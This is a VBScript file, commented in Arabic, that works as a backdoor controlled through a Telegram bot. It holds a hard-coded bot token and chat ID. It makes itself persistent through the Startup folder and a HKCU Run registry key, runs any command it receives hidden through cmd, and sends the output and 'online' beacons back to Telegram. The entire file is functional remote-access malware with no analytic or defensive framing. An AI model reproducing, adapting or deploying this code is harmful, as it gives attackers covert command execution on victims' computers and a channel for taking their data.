Option Explicit

Dim botToken, chatId, shell, fso, http
Dim lastUpdateId, computerName, scriptPath

botToken = "8711318219:AAFj7ddap7JMNibxMSwIDBcBd8IS36jm6NA"
chatId   = "8221773638"

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

computerName = shell.ExpandEnvironmentStrings("%COMPUTERNAME%")
scriptPath = WScript.ScriptFullName
lastUpdateId = 0

' ====================== إضافة Persistence ======================
AddPersistence

SendToTelegram "🟢 البوت بدأ - " & computerName

Do While True
    CheckForCommands
    If Minute(Now) Mod 3 = 0 Then
        SendToTelegram "🟢 ONLINE - " & computerName
    End If
    WScript.Sleep 2500
Loop

Sub AddPersistence()
    On Error Resume Next
    Dim startupFolder, regKey
    
    ' طريقة 1: Startup Folder
    startupFolder = shell.SpecialFolders("Startup")
    If Not fso.FileExists(startupFolder & "\bot.vbs") Then
        fso.CopyFile scriptPath, startupFolder & "\bot.vbs"
    End If
    
    ' طريقة 2: Registry Run (أقوى)
    regKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
    shell.RegWrite regKey & "\TelegramBot", """" & scriptPath & """", "REG_SZ"
End Sub

Sub CheckForCommands()
    On Error Resume Next
    Dim url, response, i, parts, cmd
    url = "https://api.telegram.org/bot" & botToken & "/getUpdates?offset=" & (lastUpdateId + 1) & "&limit=10"
    
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", url, False
    http.Send
    
    If http.Status = 200 Then
        response = http.ResponseText
        
        If InStr(response, """text"":""") > 0 Then
            parts = Split(response, """text"":""")
            For i = 1 To UBound(parts)
                cmd = Trim(Split(parts(i), """")(0))
                If cmd <> "" Then
                    If LCase(cmd) = "status" Or LCase(cmd) = "ستاتس" Then
                        SendStatus
                    ElseIf InStr(cmd, "/") <> 1 Then
                        ExecuteCommand cmd
                    End If
                End If
            Next
        End If
        
        If InStr(response, """update_id"":") > 0 Then
            Dim uidParts : uidParts = Split(response, """update_id"":" )
            If UBound(uidParts) > 0 Then lastUpdateId = CLng(Split(uidParts(1), ",")(0))
        End If
    End If
End Sub

Sub SendStatus()
    Dim msg
    msg = "📊 الحالة:%0A🟢 الجهاز: " & computerName & "%0A⏰ الوقت: " & Now
    SendToTelegram msg
End Sub

Sub ExecuteCommand(cmd)
    On Error Resume Next
    Dim tempFile, output, stream
    tempFile = shell.ExpandEnvironmentStrings("%TEMP%\out.txt")
    
    shell.Run "cmd /c " & cmd & " > """ & tempFile & """ 2>&1", 0, True
    
    If fso.FileExists(tempFile) Then
        Set stream = fso.OpenTextFile(tempFile, 1)
        output = stream.ReadAll
        stream.Close
        fso.DeleteFile tempFile, True
    Else
        output = "تم التنفيذ"
    End If
    
    SendToTelegram "✅ " & computerName & "%0ACommand: " & cmd & "%0A%0A" & Replace(output, Chr(10), "%0A")
End Sub

Sub SendToTelegram(text)
    On Error Resume Next
    Dim url
    url = "https://api.telegram.org/bot" & botToken & "/sendMessage?chat_id=" & chatId & "&text=" & Replace(Replace(text, " ", "%20"), "%0A", Chr(10))
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", url, False
    http.Send
End Sub
